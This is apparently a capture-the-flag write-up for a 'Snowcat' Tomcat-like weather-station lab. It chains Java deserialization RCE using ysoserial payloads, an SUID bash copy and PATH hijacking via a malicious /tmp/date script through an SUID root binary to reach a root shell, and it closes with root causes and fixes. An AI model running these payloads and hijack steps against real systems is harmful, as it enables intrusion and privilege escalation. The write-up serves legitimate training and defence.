# ❄️ Snowcat RCE & Priv Esc

**Difficulty:** 3  
**Challenge Goal:**  
Exploit multiple vulnerabilities in the Snowcat weather monitoring infrastructure to achieve Remote Code Execution (RCE), escalate privileges to root, and retrieve the authorization key belonging to the *other* weather application.

---

## 🧠 Scenario Summary

The *Neighborhood Weather Monitoring Station* is powered by a custom Snowcat (Tomcat‑like) server that integrates legacy C binaries for collecting temperature, humidity, and pressure data.  
Due to accumulated technical debt, several critical security flaws remain unpatched:

- Unsafe Java deserialization in the Snowcat web service
- SUID binaries invoking shell commands insecurely
- Trust in environment variables such as `PATH`
- Configuration‑driven privilege switching

As an attacker, you are provided with limited local access and must chain these weaknesses to fully compromise the system.

---

## 📖 Challenge Description

We've lost access to the neighborhood weather monitoring station.  
There are a couple of vulnerabilities in the Snowcat and weather monitoring services that we haven't gotten around to fixing.

Your mission is to:

1. Achieve **remote code execution** through the Snowcat service.
2. Escalate privileges locally by abusing legacy **SUID binaries**.
3. Gain **root access** to the system.
4. Retrieve the authorization key used by the *other* weather application.

---

## Environment Overview

- Snowcat (Apache Tomcat 9.0.90 fork)
- Java deserialization vulnerability (CVE-2025-24813–style) https://nvd.nist.gov/vuln/detail/CVE-2025-24813
- Custom SUID binaries:
  - `/usr/local/weather/temperature`
  - `/usr/local/weather/humidity`
  - `/usr/local/weather/pressure`
- Misconfigured PATH handling
- Insecure use of `system()` inside SUID binaries

---

## Vulnerability Chain Summary

1. **Java Deserialization RCE**
2. **Command execution as `snowcat`**
3. **SUID binary abuse to escalate to `snowcat`**
4. **PATH hijacking via SUID root binary**
5. **Root privilege escalation**

---

## Step 1 — Remote Code Execution (Java Deserialization)

Snowcat is vulnerable to unsafe Java object deserialization using **Apache Commons Collections**.

We generate a payload using **ysoserial**:

```bash
java -jar ysoserial.jar CommonsCollections5 "cp /usr/bin/bash /tmp/bashsnow" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "chmod a+x /tmp/bashsnow" > payload2.bin
java -jar ysoserial.jar CommonsCollections5 "chmod 4755 /tmp/bashsnow" > payload3.bin
```

These payloads are delivered via HTTP `PUT` requests to the vulnerable session endpoint.

Once triggered, they execute server-side as **snowcat**.

---

## Step 2 — Gaining a `snowcat` Shell

Execute the SUID bash binary:

```bash
/tmp/bashsnow -p
```

Verify:

```bash
whoami
# snowcat
```

At this stage, we have a stable local shell as `snowcat`.

---

## Step 3 — Identifying SUID Privilege Escalation

SUID binaries discovered:

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
```

Relevant binaries:

- `/usr/local/weather/temperature`
- `/usr/local/weather/humidity`
- `/usr/local/weather/pressure`

Binary analysis (`strings`) reveals:

- Use of `system()`
- Execution of `/usr/local/weather/logUsage`
- No absolute paths for common commands (`date`, `mkdir`)

This confirms **PATH hijacking** is possible.

---

## Step 4 — PATH Hijack via SUID Root Binary

The `temperature` binary runs with **effective UID 0 (root)** and executes:

```bash
/usr/local/weather/logUsage
```

`logUsage` internally calls:

- `date`
- `mkdir`

Without absolute paths.

### Malicious `date` Payload

```bash
cat << 'EOF' > /tmp/date
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x /tmp/date
```

### Triggering the Hijack

```bash
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
```

---

## Step 5 — Root Shell

```bash
/ tmp/rootbash -p
whoami
# root
```

Full root access obtained.

<img width="752" height="227" alt="image" src="https://github.com/user-attachments/assets/50c5134f-d11a-41db-9fd5-e3e546e6c4d4" />

<img width="486" height="90" alt="image" src="https://github.com/user-attachments/assets/1db78a20-58f2-4618-b074-18def617b906" />

---

## Root Cause Analysis

| Vulnerability | Impact |
|--------------|-------|
Unsafe Java deserialization | RCE |
Hardcoded authorization key | Predictable access |
SUID binaries using `system()` | Command injection |
Relative PATH execution | PATH hijacking |
Writable `/tmp` directory | Privilege escalation |

---

## References

- CVE-2015-4852 — Apache Commons Collections
- CVE-2025-24813 — Apache Tomcat RCE
- GTFOBins — SUID & PATH hijacking
- OWASP Top 10 — Insecure Deserialization

---

## Conclusion

This challenge demonstrates how **small misconfigurations compound** into full system compromise:

> RCE → Local Shell → SUID Abuse → PATH Hijack → Root

Fixes include:
- Disable Java deserialization
- Remove `system()` from SUID binaries
- Use absolute paths
- Drop unnecessary SUID bits

---

**Challenge: Snowcat RCE & Priv Esc — Completed Successfully**


Once obtained, submit the unused application's authorization key to complete the challenge.
